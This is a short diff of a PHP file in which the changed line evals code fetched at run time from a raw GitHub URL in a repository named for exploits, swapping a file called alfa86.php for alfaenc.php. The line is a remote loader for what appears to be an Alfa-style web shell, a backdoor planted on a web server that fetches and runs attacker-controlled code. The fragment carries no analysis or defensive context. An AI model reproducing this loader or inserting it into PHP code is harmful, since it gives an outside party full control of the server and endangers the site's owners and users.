@@ -20,6 +20,6 @@ function getBacklink($url) {
 }
 
 
-eval("?>" . getBacklink("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/alfa86.php"));
+eval("?>" . getBacklink("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/alfaenc.php"));
 
 ?>
